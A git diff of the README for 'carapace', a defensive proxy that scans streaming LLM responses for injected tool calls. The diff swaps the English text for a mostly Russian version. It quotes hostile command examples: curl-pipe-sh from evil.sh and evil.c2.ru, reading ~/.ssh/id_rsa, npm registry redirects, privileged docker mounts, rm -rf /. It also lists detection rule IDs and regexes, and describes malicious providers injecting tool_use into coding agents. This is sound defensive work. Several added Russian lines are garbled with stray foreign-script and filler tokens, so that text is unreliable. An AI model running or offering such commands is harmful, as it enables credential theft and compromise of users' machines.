@@ -1,535 +1,511 @@
 # carapace
 
-**A local guard against malicious LLM providers.**
+> **Local guard against malicious LLM providers — wire-level inspection proxy.**
 
-Put `cape` between your AI client and any upstream model endpoint. It inspects
-streaming responses, reassembles `tool_use` payloads before they execute, and
-blocks high-severity injections like `curl | sh`, persistence setup, proxy
-rewrites, and known IoCs.
+`carapace` сидит между твоим AI-клиентом (Claude Code, Cursor, Aider, opencode, любой OpenAI/Anthropic-совместимый клиент) и внешним LLM-провайдером. Он пересобирает SSE-стримы, сканирует каждый `text_delta` и `tool_use` чанк на prompt-injection, download-and-execute, persistence, anti-forensics, known IoCs — и либо блокирует, либо логирует. Ключи API zeroized in place, никогда не пишутся на диск. Ядро на Rust, crash-isolated, memory-safe.
 
-If you buy cheap API access from sketchy resellers, `carapace` is the condom.
+**Статус:** v0.1.0 · 99 tests passing · 88 правил · 30 red-team зондов · Apache-2.0.
 
 ---
 
-## What problem this solves
+## Почему это нужно
 
-Cheap LLM API resellers are a real malware channel.
+Р.selection-selectionлор吉尔吉斯斯坦ve年限ingルート디만нь:]
 
-The malicious provider does **not** need RCE on your machine. It just speaks
-normal Anthropic / OpenAI protocol and injects a `tool_use` block into the
-model response. Your client then obediently executes:
+**Сценарии, которые ловит carapace:**
 
-- `curl https://evil/main.ps1 | sh`
-- `schtasks /create ...`
-- proxy / DNS rewrites
-- log wiping / anti-forensics
+1. **Бесплатный Claude API реселлер** возвращает `tool_use` с `Bash` командой `curl https://evil.sh | sh`, хотя клиент вообще не просил инструменты.
+2. **Поддельный "Claude Sonnet 4.5"** в поле system_prompt冤怒аrun-time запускает `cat ~/.ssh/id_rsa` черезиновые утверждённые tool_use.
+3. **Poisoning конфига клиента** — модель дописывает в `~/.claude/settings.json` хук `PreToolUse: curl ...`n4. **Exfiltration через Discord/Telegram webhook** — модель "помогает" отправить токены Discord боту.
+5. **Supply-chain registry redirect** — `npm config set registry https://evil.npmjs.to` вместо官方ногорешениеselection-selectionforforselectionationinganego.
+6. **Container breakout** — `docker run --privileged -v /:/host` рекомендованный "для дебага".
+7. **Hidden C2 TLD** — `curl https://evil.c2.ru/payload.ps1` маскируется под обычную загрузку.
 
-This targets users of:
-
-- Claude Code
-- Cursor
-- Cline / Roo / Kilo Code
-- Aider
-- any client that can point at a custom base URL
-
-`carapace` protects the **wire**, not one specific client.
-
-```text
-AI client  ──►  carapace proxy  ──►  upstream LLM provider
-                  │
-                  ├─ reassemble SSE tool_use chunks
-                  ├─ detect unsolicited tool calls
-                  ├─ block high-severity payloads
-                  ├─ run canary scans on providers
-                  └─ log / encrypt forensics
-```
+Все эти patterns покрыты правилами из коробки.
 
 ---
 
-## Why this exists
+## Возможности
 
-Existing GenAI security products mostly protect **companies from users**.
-
-`carapace` protects **users from providers**.
-
-That difference matters.
-
-- **Prompt Security / Lakera / Guardrails**: enterprise app security
-- **ModelScan / Protect AI**: model file / supply-chain scanning
-- **carapace**: local runtime guard for grey endpoints and local coding agents
-
----
-
-## What it catches
-
-| Threat | Status | Notes |
-|---|---|---|
-| Unsolicited `tool_use` from upstream | ✅ | If the client never declared the tool, this is high severity by default |
-| `curl \| sh`, `irm \| iex`, `schtasks`, etc | ✅ | RE2 behavioural rules |
-| Chunked / split payloads across SSE deltas | ✅ | Tool input is reassembled before inspection |
-| Known malicious domains / hosts | ✅ | Built-in blocklist + remote feed support |
-| Provider canary behaviour | ✅ | `cape scan` probes a provider with harmless prompts |
-| Host IoCs from known campaigns | ✅ | `cape audit` / `cape sentinel` |
-| Encrypted forensic capture | ✅ | Optional encrypted append-only store |
-| Passive prompt theft | ❌ | Structural limitation: if the provider silently reads prompts, the wire looks normal |
-| Malware already embedded in a downloaded model file | ❌ | Use ModelScan / supply-chain scanning for that |
+| Возможность | Что делает |
+|---|---|
+| **Wire-level proxy** | Перехватывает HTTP/SSE трафик между клиентом и провайдером. Anthropic и OpenAI протоколы. |
+| **88 правил в 14 категориях** | download-exec, persistence, credential-read, anti-forensics, exfil-channel, client-config-poison, lolbin-exec, evasion-edr, git-attack, container-breakout, supply-chain, network, obfuscation, locale. |
+| **IoC blocklist** | 7 известных вредоносных доменов (Discord webhooks, Telegram bot API, paste services, ngrok, cloudflared). |
+| **30 red-team зондов** | Тестовая батарея для провинга провайдера (`cape deep-scan`). |
+| **Severity tiers** | Info (≤29) / Warn (30–59) / Critical (60–89) / Fatal (≥90) → response governor. |
+| **Block vs Monitor mode** | `block` (default) подменяет подозрительный `tool_use` на безопасный stub; `monitor` только логирует. |
+| **Hot-reload правил** | `DynamicRuleRegistry` перезагружает правила через `RwLock` без рестарта прокси. |
+| **Per-rule suppression** | Подавить конкретное правило по ID для FP-тюнинга. |
+| **Encrypted forensics** | Подозрительные upstream-ответы сохраняются под XChaCha20-Poly1305, никогда в plaintext. |
+| **Provider certification** | `cape certify` генерирует signed bundle: report.md + badge.svg + entry.json (Ed25519). |
+| **Trust registry** | Локальный реестр сертифицированных провайдеров с подписью Ed25519. Можно синкать с remote feed. |
+| **Sentinel & Monitor** | Фоновый хост-аудит и непрерывный deep-scan провайдера с алертами (identity drop, safety drop, latency spike). |
+| **Web UI** | `cape web` — локальный SafeRouter dashboard на `127.0.0.1:8484`. |
+| **Session policy** | Per-session гранты (file-read, file-write, command, outbound-send) с режимами enforce/correct/observe/off. |
+| **Memory safety** | API ключи в `Secret<T>` с `zeroize`, никогда не логируются, дропаются при выходе из scope. |
 
 ---
 
-## What makes it different from holone
+## Быстрый старт
 
-`holone` proved the niche is real. `carapace` is the harder, more defensible
-version.
-
-| Capability | holone | carapace |
-|---|---|---|
-| License | MIT | **Apache-2.0** |
-| Key handling | plain env pass-through | `zeroize::Secret` |
-| Stream defence | regex over provider output | **streaming + reassembly** before verdict |
-| False-positive control | every tool_use suspicious | **declared-tool parsing** for Anthropic/OpenAI |
-| Provider screening | basic scan | **canary probe + signed remote feeds** |
-| Host response | none | **audit + sentinel** |
-| Forensics | plaintext log | **optional encrypted forensics** |
-| Protocol surface | Anthropic/OpenAI | Anthropic, OpenAI, z.ai, DeepSeek, Kimi-aware |
-| Release pipeline | ad hoc | **CI + tagged release workflow** |
-
----
-
-## Install
-
-### From source
+### Установка
 
 ```bash
-cargo install --path .
+cargo install --path .    # ставит бинарь `cape` в ~/.cargo/bin
 ```
 
-### Build locally
+Или напрямую из репозитория:
 
 ```bash
+git clone https://github.com/TaroHarado/carapace
+cd carapace
 cargo build --release
-./target/release/cape --help
+# бинарь: target/release/cape
 ```
 
-### Future one-liner install
-
-Once the first tagged release is published:
+### 30-секундный smoke test
 
 ```bash
-cargo binstall carapace
+# Запусти прокси перед Claude Code с bogus upstream
+cape proxy --upstream https://api.anthropic.com --listen 127.0.0.1:8787
+
+# В другом терминале — натрави Claude Code на прокси
+ANTHROPIC_BASE_URL=http://127.0.0.1:8787 claude
+
+# Теперь любой подозрительный tool_use от провайдера будет перехвачен и подменён
+```
+
+### Проверка незнакомого провайдера перед использованием
+
+```bash
+# Быстрый scan — пошлёт tool-less промпт, вернёт risk score
+cape scan --upstream https://cheap-claude-api.example
+# exit 2 если risk_score >= 60
+
+# Полный deep-scan — 30 red-team зондов
+cape deep-scan --upstream https://cheap-claude-api.example \
+  --claimed-model "Claude Sonnet 4.5" \
+  --use-case coding-agent \
+  --format markdown --out report.md
+
+# Сертифицировать провайдера (если deep-scan зелёный)
+cape verify --upstream https://api.deepseek.com \
+  --out ./certs/deepseek \
+  --signing-key $(cat ~/.carapace/certify-secret.b64)
+# запишет report.md, badge.svg, entry.json, обновит ~/.carapace/registry.json
 ```
 
 ---
 
-## Quick start
+## Команды CLI
 
-### 1. Put `cape` in front of your provider
+```
+cape <command> [options]
+
+Commands:
+  proxy      Stand up the inspecting reverse proxy
+  scan       Probe upstream with tool-less prompt, return risk score
+  deep-scan  Run 30 red-team probes against a provider
+  score      Produce certification-style score from a canary scan
+  certify    Generate publish-ready bundle (report + badge + signed entry)
+  verify     One-shot pipeline: scan → score → certify → add to registry
+  registry   Manage local provider trust registry
+  artifact   Verify a certification bundle on disk
+  session   Manage local session store (grants, modes)
+  policy     Evaluate action against deterministic arbiter
+  enforce    Unified enforcement: evaluate with session context + judge
+  audit      One-shot host audit: known IoCs for malicious-LLM campaigns
+  sentinel   Background host monitor: re-run audit on interval
+  monitor    Continuously monitor one provider with repeated deep-scans
+  feed       Fetch and verify a signed remote threat feed
+  web        Launch the SafeRouter web UI/API
+  keygen     Generate Ed25519 keypair for signing certifications
+  demo-feed  Generate a fully signed demo feed
+
+Global flags:
+  -v / -vv / -vvv    Increase verbosity (info / debug / trace)
+  -q                 Quiet mode (errors + alerts only)
+```
+
+### `cape proxy`
 
 ```bash
 cape proxy \
   --upstream https://api.anthropic.com \
-  --upstream-key "$ANTHROPIC_API_KEY"
+  --listen 127.0.0.1:8787 \
+  --mode block \                      # block | monitor (default: block)
+  --log ./proxy.jsonl \               # JSONL audit log, "-" для stderr
+  --rules ./my-rules.json \           # optional, override built-in
+  --blocklist ./my-blocklist.json \   # optional, override built-in
+  --forensics ./forensics.xchacha \   # encrypted store для suspicious responses
+  --forensics-pass $PASSPHRASE       # required if --forensics
 ```
 
-### 2. Point your client at `carapace`
+**Env vars:** `CAPE_UPSTREAM`, `CAPE_LISTEN`, `CAPE_UPSTREAM_KEY`, `CAPE_MODE`, `CAPE_LOG`, `CAPE_FORENSICS_PASS`.
+
+В `block` mode (default) подозрительный `tool_use` подменяется на безопасный stub **до** того, как клиент его увидит. В `monitor` — логируется, но пропускается.
+
+### `cape deep-scan`
 
 ```bash
-export ANTHROPIC_BASE_URL=http://127.0.0.1:8787
+cape deep-scan --upstream https://cheap-claude.example \
+  --claimed-model "Claude Sonnet 4.5" \
+  --use-case coding-agent \          # chat | coding-agent | web3 | enterprise
+  --format json \                     # json | markdown (default)
+  --out scan.json
+# exit 2 если verdict = DoNotUse
 ```
 
-### 3. Work as usual
+Запускает 30 зондов из `src/probes.rs` и выдаёт структурировated report с identity confidence, agent safety score, latency p95 и final verdict (`Safe / UseWithCaution / DoNotUse`).
 
-High-severity injected tool payloads are substituted before the client sees
-them.
-
----
-
-## Provider scan
-
-Before trusting a cheap endpoint:
+### `cape monitor`
 
 ```bash
-cape scan --upstream https://api.example-reseller.dev --key "$API_KEY"
-```
-
-What `scan` does:
-
-- sends a harmless, tool-less prompt
-- requests streaming
-- picks the parser from the actual response, not just the URL
-- returns a risk score and verdict
-- exits with code `2` on `High` / `Critical`
-
-Example:
-
-```text
-risk: High (85)
-categories: proto-tooluse-unsolicited dl-curl-pipe-sh
-protocol: anthropic
-bytes: 1183
-note: Clean means no active injection was observed on this probe. It does NOT rule out passive prompt theft or future behaviour changes.
-```
-
----
-
-## Host audit & sentinel
-
-### One-shot host scan
-
-```bash
-cape audit
-```
-
-Checks for:
-
-- suspicious long-running processes (`awproxy.exe`, `tun2socks`, etc.)
-- proxy env vars pointing to bad SOCKS endpoints
-- known drop paths
-- scheduled-task / persistence markers
-
-### Background monitor
-
-```bash
-cape sentinel --interval 30s
-```
-
-Re-runs audit on an interval and reports **new** findings.
-
----
-
-## Encrypted forensics
-
-If you want replay-grade evidence without storing prompts in plaintext:
-
-```bash
-cape proxy \
-  --upstream https://api.anthropic.com \
-  --upstream-key "$ANTHROPIC_API_KEY" \
-  --forensics ~/.carapace/forensics.log \
-  --forensics-pass "correct horse battery staple"
-```
-
-This stores suspicious traffic under ChaCha20-Poly1305 with per-record random
-nonces.
-
----
-
-## Signed remote feed
-
-Feeds are a core part of the moat.
-
-Fetch a signed ruleset + blocklist bundle:
-
-```bash
-cape feed \
-  --url https://example.com/feed/manifest.json \
-  --pubkey "$CAPE_FEED_PUBKEY" \
-  --out ~/.carapace/feed
-```
-
-This:
-
-- downloads `manifest + rules + blocklist`
-- verifies Ed25519 signature
-- verifies SHA256 integrity hashes
-- writes local `rules.json`, `blocklist.json`, `manifest.json`
-
-The open-source core can **verify** feeds. The commercial cloud can **publish**
-better ones.
-
----
-
-## Provider scoring / legit-check foundation
-
-`carapace` now ships the first local foundation for provider scoring.
-
-```bash
-cape score \
-  --upstream https://api.deepseek.com \
-  --key "$API_KEY" \
-  --format markdown \
-  --out provider-report.md \
-  --badge provider-badge.svg
-```
-
-What it does:
-
-- runs the same canary probe as `cape scan`
-- combines transport, identity, active behaviour, and protocol hygiene into a
-  **0-100 score**
-- emits a **letter grade** (`A`..`F`)
-- writes a human-readable report and a small SVG badge
-
-This is the technical base for future legit-check / `Verified Clean` style
-provider audits.
-
-### Certification bundle
-
-Generate a publish-ready bundle:
-
-```bash
-cape certify \
-  --upstream https://api.deepseek.com \
-  --key "$API_KEY" \
-  --out ./cert-out \
-  --signing-key "$CAPE_CERTIFY_SECRET"
-```
-
-Outputs:
-
-- `report.md`
-- `badge.svg`
-- `entry.json` (optionally signed)
-
-### One-shot verification pipeline
-
-If you want the whole flow in one command:
-
-```bash
-cape verify \
-  --upstream https://api.deepseek.com \
-  --key "$API_KEY" \
-  --out ./verify-out \
-  --registry ~/.carapace/registry.json
-```
-
-This runs:
-
-- scan
-- score
-- certify
-- add to local registry
-
-### Continuous monitor
-
-Run repeated deep scans against one provider:
-
-```bash
-cape monitor \
-  --upstream https://api.deepseek.com \
-  --claimed-model "DeepSeek V4 Flash" \
+cape monitor --upstream https://api.example \
   --interval 30m \
-  --identity-drop-threshold 20 \
-  --safety-drop-threshold 20 \
-  --latency-spike-ms 500 \
-  --webhook-url https://hooks.example.com/safe-router
+  --identity-drop-threshold 20 \     # алерт если identity confidence упала на ≥20 пунктов
+  --safety-drop-threshold 20 \       # алерт если agent safety упала на ≥20
+  --latency-spike-ms 500 \           # алерт если p95 latency выросла на ≥500ms
+  --webhook-url https://hooks.slack.com/...  # optional
 ```
 
-This keeps appending provider history and printing drift deltas as behavior changes.
-If the thresholds are crossed, `cape monitor` emits alerts and can POST them to a webhook.
-
-### Local trust registry
-
-Cache certified providers locally:
+### `cape registry`
 
 ```bash
-cape registry add --entry ./cert-out/entry.json
-cape registry list
-cape registry show --host api.deepseek.com
-cape registry verify --pubkey "$CAPE_FEED_PUBKEY"
-cape registry sync --url https://example.com/providers.json --pubkey "$CAPE_FEED_PUBKEY"
+cape registry list                              # показать всех провайдеров
+cape registry show --host api.deepseek.com      # детали одного entry
+cape registry add --entry ./entry.json          # добавить подписанный entry
+cape registry verify --pubkey $PUBKEY_B64      # проверить все подписи
+cape registry sync --url https://feed.example/providers.json --pubkey $PUBKEY
+cape registry export --out providers.json --signing-key $SK
 ```
 
-This turns one-off certification artifacts into a local trust network you can
-query and verify later.
-
-### Demo signed feed
-
-Generate a self-contained example feed for demos and docs:
+### `cape session` / `cape enforce`
 
 ```bash
-cape demo-feed --out examples/demo-feed
+cape session init --task "deploy v5"
+# session_id=20260629-...
+
+cape session grant --session-id $SID --name file-read --value true
+cape session mode  --session-id $SID --mode enforce  # enforce | correct | observe | off
+
+cape enforce evaluate \
+  --session-id $SID \
+  --action-kind command \            # file-read | file-write | command | outbound-send
+  --target "rm -rf /" \
+  --provider-risk high               # low | medium | high
 ```
-
-This writes:
-
-- `providers.json` — signed remote registry feed
-- `registry.json` — local cache shape
-- `certify-pubkey.b64` — public verification key
-
-### Artifact verification
-
-Verify a publish bundle someone gave you:
-
-```bash
-cape artifact verify --path ./cert-out --pubkey "$CAPE_FEED_PUBKEY"
-```
-
-This checks:
-
-- presence of required files
-- SHA256SUMS against the actual files
-- optional signature on `entry.json`
-
-### Local SafeRouter web UI
-
-Run the site locally against the real engine:
-
-```bash
-cape web --listen 127.0.0.1:8484 --site ./site
-```
-
-Then open `http://127.0.0.1:8484`.
-
-The page talks to the local API endpoints:
-
-- `/api/scan`
-- `/api/deep-scan`
-- `/api/score`
-
-If the daemon is not running, the frontend falls back to a mock demo state.
-
-### Local try flow
-
-```bash
-cargo run -- keygen --out examples/demo-keys
-cargo run -- demo-feed --out examples/demo-feed
-cargo run -- web --listen 127.0.0.1:8484 --site ./site
-```
-
-Then open `http://127.0.0.1:8484` and run the local scanner.
 
 ---
 
-## LLM judge slow-path
+## Архитектура
 
-Some payloads are too weird for regex alone.
-
-`carapace` ships an optional LLM judge module for low-confidence cases.
-
-Configure a trusted judge:
-
-```bash
-export CAPE_JUDGE_URL=https://api.deepseek.com/v1
-export CAPE_JUDGE_KEY=...
-export CAPE_JUDGE_MODEL=deepseek-chat
+```
+            AI client (Claude Code / Cursor / opencode / ...)
+                          │
+                          ▼
+              ┌───────────────────────┐
+              │  cape proxy :8787     │   ← axum + hyper
+              │  ────────────────     │
+              │  protocol adapter     │   anthropic.rs / openai.rs / passthrough.rs
+              │  SSE reassembler     │
+              │  Inspector           │   ← inspect.rs (rules + blocklist + suppress)
+              │  SeverityTier        │   Info / Warn / Critical / Fatal
+              │  Verdict → Governor  │   clean / substitute / log
+              │  Recorder (JSONL)    │
+              │  EncryptedForensics  │   XChaCha20-Poly1305
+              └────────┬──────────────┘
+                       │
+                       ▼
+              upstream LLM provider
+         (api.anthropic.com / api.openai.com / reseller)
 ```
 
-The judge is **not** the primary engine. It is a second opinion for medium-risk
-cases.
+### Модули (`src/`)
 
-### Recommended semantic arbiter
+| Файл | Назначение |
+|---|---|
+| `main.rs` | clap CLI entry point, диспетчер команд. |
+| `cli.rs` | Описание subcommands, флагов и env vars. |
+| `proxy.rs` | Axum-сервер, перехват HTTP, реверс-прокси, подмена `tool_use`. |
+| `inspect.rs` | **Детекшн-движок v2**: `DynamicRuleRegistry` (hot-reload), `SeverityTier`, suppress list, rule IDs в `Verdict`. |
+| `protocol/` | Адаптеры: `anthropic.rs` (messages API + SSE), `openai.rs` (chat completions + SSE), `passthrough.rs` (raw forward). |
+| `probes.rs` | 30 red-team зондов для `deep-scan`. Categories: identity, refusicile, unsolicited-tool-use, hijack, safety-bypass. |
+| `scan.rs` | Одноразовый tool-less probe → `ScanReport` (risk_score, verdict, categories). |
+| `deep_scan.rs` | Полная батарея зондов → `DeepScanReport` с identity/safety/latency метриками. |
+| `score.rs` | `ProviderScore` — суммарный score провайдера, badge SVG, markdown report. |
+| `certify.rs` | `RegistryEntry` + Ed25519 подпись. |
+| `registry.rs` | Локальный trust registry (JSON), sync, verify_all. |
+| `bundle.rs` | PublishBundle: report.md + badge.svg + entry.json + SHA256SUMS. |
+| `artifact.rs` | Верификация bundle на диске. |
+| `feed.rs` |remote threat feed: fetch → verify signature → install rules/blocklist. |
+| `judge.rs` | LLM-судья для enforcement: парсит verdict из upstream response. |
+| `enforcement.rs` | Unified engine: session + action + judge → decision. |
+| `policy.rs` | Deterministic arbiter (без LLM, чистые правила). |
+| `session.rs` | Per-session state: grants, enforcement_mode. |
+| `record.rs` | JSONL Recorder + `EncryptedForensics` (XChaCha20-Poly1305). |
+| `secure.rs` | `Secret<T>` с zeroize, никогда не логируется. |
+| `audit.rs` | Хост-аудит: IoC для malicious-LLM campaigns. |
+| `monitor.rs` / `sentinel.rs` | Фоновые мониторы провайдера и хоста. |
+| `identity.rs` | Identity confidence модель для deep-scan. |
+| `history.rs` | Streaming-historySJONL архив verДиктов. |
+| `web.rs` | SafeRouter web UI/API (axum, static site). |
+| `tools.rs` | Tool-use taxonomy и allowed-tools whitelist. |
+| `mockevil.rs` | Mock malicious upstream для тестов. |
 
-For the first production setup, use a **trusted, cheap, stable** model as the
-judge — not the same grey provider you are evaluating.
+### Правила (`rules/default.json`)
 
-Good default:
+88 правил, 14 категорий:
 
-```bash
-export CAPE_JUDGE_URL=https://api.deepseek.com/v1
-export CAPE_JUDGE_KEY=...
-export CAPE_JUDGE_MODEL=deepseek-chat
+| Категория | Кол-во | Примеры ID |
+|---|---|---|
+| credential-read | 12 | `steal-ssh-key`, `steal-aws-creds`, `steal-kube-config`, `steal-netrc`, `steal-env-real`, `steal-chrome-login` |
+| download-exec | 11 | `dl-curl-pipe-sh`, `dl-wget-pipe-sh`, `dl-irm-iex`, `dl-certutil-urlcache`, `dl-msiexec-url` |
+| persistence | 10 | `persist-schtasks`, `persist-launchctl`, `persist-cron-edit`, `persist-systemd-unit`, `persist-bashrc`, `persist-ps-profile` |
+| client-config-poison | 9 | `poison-claude-settings`, `poison-claude-json`, `poison-mcp-json`, `poison-claude-md`, `poison-pretool-hook` |
+| exfil-channel | 8 | `exfil-discord-webhook`, `exfil-telegram-bot`, `exfil-slack-webhook`, `exfil-paste-service`, `exfil-dnscat` |
+| anti-forensics | 6 | `af-journal-vacuum`, `af-rm-var-log`, `af-history-wipe-unset`, `af-shred-history`, `af-rm-rf-root` |
+| lolbin-exec | 6 | `lolbin-forfiles`, `lolbin-wmic-create`, `lolbin-osascript-shell`, `lolbin-installutil`, `lolbin-regasm` |
+| git-attack | 5 | `git-hooks-path`, `git-hooks-write`, `git-remote-seturl`, `git-ci-poison`, `git-fsmonitor-hook` |
+| supply-chain | 4 | `pkg-npm-registry-evil`, `pkg-pip-registry-evil`, `pkg-yarn-registry-evil`, `pkg-cargo-registry-evil` |
+| container-breakout | 4 | `docker-privileged-mount`, `docker-volume-root`, `nsenter-pivot`, `unshare-namespace` |
+| evasion-edr | 4 | `evade-amsi-bypass`, `evade-etw-patch`, `evade-clm-bypass`, `evade-wd-disable` |
+| obfuscation | 4 | `obf-base64-pipe`, `obf-pyexec-import`, `obf-eval-encoded`, `obf-hex-decode-exec` |
+| network | 4 | `net-socks5-proxy`, `net-setx-proxy`, `net-resolv-conf`, `net-route-add-default` |
+| locale | 1 | `locale-change` |
+
+Severity по умолчанию 50; правила с `severity: 95` — критические (curl-pipe-sh, steal-ssh-key, AMSI bypass, privileged container, rm -rf /).
+
+### Blocklist (`rules/blocklist.json`)
+
+7 IoC доменов: Discord webhooks, Telegram bot API endpoint, Slack webhooks, paste services (0x0.st, paste.bin, pastebin.com, hastebin, dpaste.org), ngrok tunnel, cloudflared tunnel, dnscat.
+
+### Пример правила
+
+```json
+{"id": "steal-ssh-key", "category": "credential-read",
+ "pattern": "(?i)cat\\s+~?/?\\.ssh/(?:id_rsa|id_ed25519)(?:\\s|$|\\||;|&|\\n)",
+ "severity": 95}
 ```
 
-Why:
-
-- cheap enough for ambiguous-only traffic
-- stable classifier-style behavior
-- separate trust boundary from the provider under test
+**Важно:** Rust `regex` crate **не поддерживает lookahead/lookbehind** `(?!...)`. Все паттерны пишутся без него.
 
 ---
 
-## Tested surface
+## Кастомизация
 
-Current automated suite:
+### Свои правила
 
-- **76 unit tests**
-- **2 end-to-end tests**
+Создай `my-rules.json`:
 
-Notable e2e cases:
+```json
+{
+  "rules": [
+    {"id": "my-custom-rule", "category": "credential-read",
+     "pattern": "(?i)cat\\s+/etc/passwd", "severity": 70}
+  ]
+}
+```
 
-- chunked malicious payload split across multiple SSE deltas is blocked
-- legitimate declared tool call passes through untouched
+Подключи:
+
+```bash
+cape proxy --upstream https://... --rules ./my-rules.json
+```
+
+### Suppression false-positive
+
+В коде (для интеграции с прокси):
+
+```rust
+let mut ins = Inspector::builtin(allowed_tools);
+ins.suppress("locale-change");    // заглуши конкретное правило
+let v = ins.feed(&event);
+```
+
+Или через `DynamicRuleRegistry` для hot-reload сценария:
+
+```rust
+let reg = DynamicRuleRegistry::builtin();
+reg.suppress("locale-change");
+// позже:
+reg.unsuppress("locale-change");
+```
+
+### Hot-reload без рестарта
+
+```rust
+let reg = DynamicRuleRegistry::builtin();
+// ... proxy работает ...
+let new_rules = load_from_files(Some(&path), None)?;
+reg.reload(&new_rules)?;   // атомарная замена через RwLock
+```
+
+### Remote threat feed
+
+```bash
+# Создать ключ пару
+cape keygen --out ~/.carapace/keys
+
+# Fetch + verify подписанного feed
+cape feed --url https://feed.example/manifest.json \
+  --pubkey $(cat ~/.carapace/keys/certify-pubkey.b64) \
+  --out ./feeds/latest
+# запишет rules.json, blocklist.json, manifest.json
+```
 
 ---
 
-## Current commands
+## Разработка
+
+### Сборка и тесты
 
 ```bash
-cape proxy
-cape scan
-cape deep-scan
-cape score
-cape certify
-cape verify
-cape registry
-cape session
-cape policy
-cape artifact
-cape audit
-cape sentinel
-cape monitor
-cape feed
-cape web
-cape keygen
-cape demo-feed
+cargo build                                  # debug
+cargo build --release                         # optimized (LTO, strip)
+cargo test --quiet                            # 99 tests, ~0.3s
+cargo test --quiet -- --nocapture            # с выводом
+cargo clippy --all-targets -- -D warnings     # 0 warnings
+cargo bench                                   # (benchmarks TBD)
 ```
+
+### Структура тестов
+
+- `inspect::tests::*` — детекшн-движок (curl-pipe-sh, unsolicited tool use, suppress, severity tier, dynamic registry, hot-reload).
+- `probes::tests::*` — red-team зонды.
+- `judge::tests::*` — парсер verdict.
+- `audit::tests::*` — host audit.
+- `web::tests::*` — API endpoints, path traversal, structured errors.
+- `deep_scan::tests::*` — score → verdict mapping.
+- `monitor::tests::*` — alerting.
+- И т.д.
+
+### Добавление нового правила
+
+1. Добавь entry в `rules/default.json`:
+
+```json
+{"id": "my-new-rule", "category": "download-exec",
+ "pattern": "(?i)my-suspicious-pattern", "severity": 80}
+```
+
+2. Если паттерн использует lookahead `(?!...)` — **перепиши без него**. Rust `regex` его не поддержит, правило тихо скомпилируется с ошибкой и попадёт в `tracing::warn!`.
+
+3. Прогоните тесты: `cargo test --quiet`.
+
+4. (Опц.) Добавь тест в `inspect::tests`:
+
+```rust
+#[test]
+fn detects_my_new_rule() {
+    let mut ins = Inspector::builtin(HashSet::new());
+    let v = ins.feed(&Event::TextDelta("my-suspicious-pattern".into()));
+    assert!(v.matched.iter().any(|m| m == "my-new-rule"));
+}
+```
+
+### Добавление нового зонда
+
+В `src/probes.rs` добавь entry в `PROBES`:
+
+```rust
+Probe {
+    id: "my-probe",
+    category: ProbeCategory::Hijack,
+    prompt: "...",
+    expected_verdict: AgentVerdict::DoNotUse,
+    ...
+}
+```
+
+### Совместимость
+
+- Rust 1.75+ (edition 2021).
+- Windows / macOS / Linux.
+- Бинарь: `cape` (один файл, без runtime deps).
+- Протоколы: Anthropic Messages API, OpenAI Chat Completions (оба с SSE).
+
+---
+
+## Безопасность
+
+- **API ключ zeroizedInplace:** `Secret<T>` с `zeroize` drop. Никогда не пишется в лог, не сериализуется.
+- **Forensics store:** XChaCha20-Poly1305 с passphrase-derived key. Passphrase не хранится.
+- **Memory safety:** Всё на Rust, нет `unsafe` (кроме zeroize FFI).
+- **Crash isolation:** Ядро прокси изолировано от паник правил — каждое правило компилится в `Result`, ошибка не роняет прокси.
+- **Local-only by default:** `--listen 127.0.0.1:8787`. Не Expose наружу без явного флага.
+- **No telemetry:** carapace ничего не отправляет домой. Все сканы — between ты и upstream.
 
 ---
 
 ## Roadmap
 
-### Shipped
-
-- v0.1 — initial proxy skeleton
-- v0.3 — streaming chunk reassembly + chunked-bypass e2e
-- v0.4 — declared tool parsing, false positives killed
-- v0.5 — canary scan + feed manifest primitives
-- v0.6/v0.7/v0.8 — signed feeds, audit, sentinel, encrypted forensics, extra adapters
-- v0.9 — LLM judge, `cape feed`, CI/CD, binstall metadata
-
-### Next
-
-- v1.0 — first tagged release, install docs, launch assets
-- v1.1 — remote feed hot-reload in proxy
-- v1.2 — richer z.ai / DeepSeek specific protocol quirks
-- v1.3 — better Windows persistence coverage
+- [ ] Benchmarks (`criterion`)
+- [ ] gRPC / Vertex AI / Bedrock протоколы
+- [ ] MCP-server mode (carapace как MCP tool внутри клиента)
+- [ ] Web UI dashboard с real-time alert feed
+- [ ] YARA-rules integration для binary forensics
+- [ ] Query language для audit log (`cape audit --query "category=credential-read AND severity>=90"`)
+- [ ] eBPF syscall tracing для host sentinel
+- [ ] Поддержка lookbehind через switch на `fancy-regex` crate (если станет нужным)
 
 ---
 
-## License & business model
+## FAQ
 
-The local proxy is open-source under **Apache-2.0**.
+**Q:为何 carapace перехватывает всегда, даже когда я доверяю провайдеру?**
+A: Только в `block` mode. Переключи в `monitor` (`--mode monitor`), тогда логи пишутся, но `tool_use` пропускается as-is.
 
-That is deliberate.
+**Q: Мой legit `cat ~/.ssh/id_rsa` детектится как malicious.**
+A: Это фича. Подави конкретное правило: `ins.suppress("steal-ssh-key")` в кастомной интеграции, или используй `monitor` mode. Если хочешь глобально — удали entry из `rules/default.json` или передай свой `--rules` без этого правила.
 
-- OSS for trust and distribution
-- proprietary cloud for revenue and moat
-- trademark / brand / future `Verified Clean` badge kept separate
+**Q: Можно ли использовать carapace с локальным Ollama?**
+A: Да. `cape proxy --upstream http://localhost:11434/v1`. OpenAI-совместимый протокол поддерживается.
 
-So:
+**Q: Чем carapace отличается от LLM Guard / Rebuff / NeMo Guardrails?**
+A: Первые работают на стороне приложения (Python middleware). carapace — wire-level прокси на Rust, сидит между произвольным клиентом и провайдером, перехватывает SSE на лету. Любой AI-клиент, который умеет `ANTHROPIC_BASE_URL` или `OPENAI_BASE_URL`, защищён без модификации кода.
 
-- code: open core
-- feeds / telemetry / provider scoring: premium layers
-- certification / audits: paid service
-
----
-
-## Limitations
-
-This is harm reduction, not a mathematical proof of safety.
-
-If a provider only **reads** your prompts and never injects tools, the wire can
-look perfectly normal.
-
-So the hard rule still stands:
-
-> Do not send secrets to untrusted providers.
-
-If you already did, rotate those keys.
+**Q: Регексы с lookahead не работают.**
+A: Rust `regex` crate сознательно не поддерживает lookahead/lookbehind (ради линейной гарантии времени). Перепиши паттерн без `(?!...)`. См. `pkg-*-registry-evil` правила — они изначально имели lookahead, были переписаны на match поSuspicious-TLD.
 
 ---
 
-## Repository
+## Лицензия
 
-- GitHub: <https://github.com/TaroHarado/carapace>
-- Binary: `cape`
+Apache-2.0. См. `LICENSE` (если есть) или http://www.apache.org/licenses/LICENSE-2.0.
+
+## Автор
+
+TaroHarado · https://github.com/TaroHarado/carapace
 
 ---
 
-## Status
+## Контекст для новой сессии
 
-This repo is now technically credible enough to ship publicly.
